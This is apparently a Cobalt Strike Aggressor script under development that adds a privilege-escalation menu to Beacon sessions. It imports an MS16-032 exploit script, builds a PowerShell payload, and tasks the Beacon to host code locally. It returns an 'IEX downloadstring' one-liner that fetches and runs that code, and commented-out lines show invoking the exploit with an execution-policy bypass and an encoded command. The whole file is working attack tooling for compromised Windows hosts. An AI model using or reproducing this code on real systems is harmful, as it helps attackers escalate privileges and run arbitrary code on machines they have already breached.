import common.*;
import beacon.*;


# Arguments: beacon id, [code to host]
sub bhost_script {
	local('$port $builder');
	$port = [CommonUtils randomPort];

	# build up our command to send to Beacon
	$builder = [new CommandBuilder];
	[$builder setCommand: 0x3b];
	[$builder addShort:   $port];
	[$builder addString:  $2];

	# task Beacon to run the above command.
	call("beacons.task", $null, $1, cast([$builder build], 'b'));

	# build and return our PowerShell one-liner
	return "IEX ((new-object net.webclient).downloadstring('http://127.0.0.1: $+ $port $+ /'))";
}


# build the powershell artifact
sub build_powershell_artifact {
	$shellcode = artifact("$1", "powershell");
	return $shellcode;
}

popup beacon_bottom{
	menu "Privilege Escalation"{
		item "Invoke MS16-032 (dev)"{
			local('$bid');
			foreach $bid ($1){
				binput($1, "powershell-import Invoke-MS16-032.ps1");
				bpowershell_import($1, script_resource("scripts/Invoke-MS16-032.ps1"));
				openPayloadHelper(lambda({
					build_powershell_artifact($1);
					# set up the self hosted script
					# bstage($bid, $2, $1);
					# binput($bid, "powershell Invoke-MS16-032 $1");
					# bpowershell($bid, "Invoke-MS16-032 \"powershell.exe -ep bypass -enc $psenc\" ");
				}, $bid => $1));
			}
		}
	}
}